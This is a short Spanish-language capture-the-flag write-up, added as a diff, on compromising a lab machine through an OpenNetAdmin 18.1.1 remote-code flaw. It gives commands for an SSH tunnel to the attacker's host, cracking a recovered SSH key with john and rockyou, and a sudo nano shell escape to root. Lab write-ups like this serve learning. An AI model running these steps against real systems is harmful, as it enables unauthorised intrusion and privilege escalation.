@@ -1,0 +1,21 @@
+Esta maquina tiene una vulnerabilidad en el panel de openadmin ubicado en el /ona en su servicio web, al buscar el sarchsploit se encuentra que la versión 18.1.1 la cual es la versión 
+instalada, es vulnerable a ejecución de código remoto.
+así que se da de alta con una conexión en reversa por medio de la ejecución del script 47691.sh y con ayuda de burpsuite ejecutando el comando de reverse coneciion.
+
+En el proceso, se encuentran varios usuarios y contraseñas, entre ellos un hash puesto en un archivo loging.php el cual está escrito en sha512, se decifra y se tiene acceso a la contraseña
+del usuario jimmy, para conectar por ssh, después de esto se evidencia que hay un acceso a al usuario johana a nivel localhost en el puerto 52846 para lo cual se usa un reverse conection
+
+ssh -R 1337:127.0.0.1:52846 kali@10.10.14.6 de esta manera se consulta despues en kali localhost:1337 y se evidencia un portal de autenticación y en él contenido una llave ssh
+
+con ssh2john.py key_copiada > hash se saca el hash para ser crackeado con john.
+
+john hash --wordlist=/usr/share/wordlist/rockyou.txt una vez crackeada la contraseña se procede a la conexión con el usuario joanna.
+
+dentro del usuario joanna al ejecutar sudo -l se observa que el comando /bin/nano corre con privilegios, así que en la página de GTFobins existe la forma de ejecutar como root.
+
+sudo /bin/nano /opt/ona
+control + r y luego control + x
+Luego se escribe lo siguiente:
+reset; sh 1>&0 2>&0
+
+Y ya se tiene acceso como administrador.
